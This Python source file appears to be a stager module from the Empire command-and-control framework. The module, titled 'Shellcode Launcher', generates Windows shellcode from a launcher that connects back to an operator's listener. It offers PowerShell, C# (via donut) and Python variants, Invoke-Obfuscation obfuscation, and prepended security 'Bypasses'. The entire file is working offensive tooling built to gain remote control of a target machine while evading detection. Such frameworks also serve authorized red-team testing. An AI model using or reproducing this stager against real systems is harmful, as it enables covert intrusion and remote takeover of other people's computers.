import logging

try:
    import donut
except ModuleNotFoundError:
    donut = None

from empire.server.utils.module_util import handle_error_message

log = logging.getLogger(__name__)


class Stager:
    def __init__(self, mainMenu):
        self.info = {
            "Name": "Shellcode Launcher",
            "Authors": [
                {
                    "Name": "Chris Ross",
                    "Handle": "@xorrior",
                    "Link": "https://twitter.com/xorrior",
                },
                {
                    "Name": "",
                    "Handle": "@monogas",
                    "Link": "",
                },
            ],
            "Description": "Generate a windows shellcode stager",
            "Comments": [""],
        }

        self.options = {
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "powershell",
                "SuggestedValues": ["powershell", "csharp", "python"],
                "Strict": True,
            },
            "DotNetVersion": {
                "Description": "Language of the stager to generate(powershell, csharp).",
                "Required": True,
                "Value": "net40",
                "SuggestedValues": ["net35", "net40"],
                "Strict": True,
            },
            "Architecture": {
                "Description": "Architecture of the .dll to generate (x64 or x86).",
                "Required": True,
                "Value": "both",
                "SuggestedValues": ["x64", "x86", "both"],
                "Strict": True,
            },
            "StagerRetries": {
                "Description": "Times for the stager to retry connecting.",
                "Required": False,
                "Value": "0",
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Proxy": {
                "Description": "Proxy to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "ProxyCreds": {
                "Description": r"Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "OutFile": {
                "Description": "Filename that should be used for the generated output.",
                "Required": True,
                "Value": "launcher.bin",
            },
            "Obfuscate": {
                "Description": "Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.",
                "Required": False,
                "Value": "False",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "ObfuscateCommand": {
                "Description": "The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.",
                "Required": False,
                "Value": r"Token\All\1",
            },
            "Bypasses": {
                "Description": "Bypasses as a space separated list to be prepended to the launcher",
                "Required": False,
                "Value": "",
            },
        }

        self.mainMenu = mainMenu

    def generate(self):
        self.options.pop("Output", None)  # clear the previous output
        # staging options
        language = self.options["Language"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]
        proxy = self.options["Proxy"]["Value"]
        proxy_creds = self.options["ProxyCreds"]["Value"]
        listener_name = self.options["Listener"]["Value"]
        stager_retries = self.options["StagerRetries"]["Value"]
        dot_net_version = self.options["DotNetVersion"]["Value"]
        bypasses = self.options["Bypasses"]["Value"]
        obfuscate = self.options["Obfuscate"]["Value"]
        obfuscate_command = self.options["ObfuscateCommand"]["Value"]
        arch = self.options["Architecture"]["Value"]

        if not self.mainMenu.listenersv2.get_active_listener_by_name(listener_name):
            # not a valid listener, return nothing for the script
            return "[!] Invalid listener: " + listener_name

        obfuscate_script = False
        if obfuscate.lower() == "true":
            obfuscate_script = True

        # generate the PowerShell one-liner with all of the proper options set
        launcher = self.mainMenu.stagergenv2.generate_launcher(
            listener_name,
            language=language,
            encode=False,
            obfuscate=obfuscate_script,
            obfuscation_command=obfuscate_command,
            user_agent=user_agent,
            proxy=proxy,
            proxy_creds=proxy_creds,
            stager_retries=stager_retries,
            bypasses=bypasses,
        )
        if launcher == "":
            return "[!] Error in launcher generation."
        if not launcher or launcher.lower() == "failed":
            return "[!] Error in launcher command generation."

        if language.lower() == "powershell":
            shellcode, err = self.mainMenu.stagergenv2.generate_powershell_shellcode(
                launcher, arch=arch, dot_net_version=dot_net_version
            )
            if err:
                return handle_error_message(err)

            return shellcode

        if language.lower() == "csharp":
            if arch == "x86":
                arch_type = 1
            elif arch == "x64":
                arch_type = 2
            elif arch == "both":
                arch_type = 3

            if not donut:
                return handle_error_message(
                    "module donut-shellcode not installed. It is only supported on x86."
                )

            return donut.create(file=str(launcher), arch=arch_type)

        if language.lower() == "python":
            shellcode, err = self.mainMenu.stagergenv2.generate_python_shellcode(
                launcher, arch=arch, dot_net_version=dot_net_version
            )
            if err:
                return handle_error_message(err)

            return shellcode

        return "[!] Invalid launcher language."
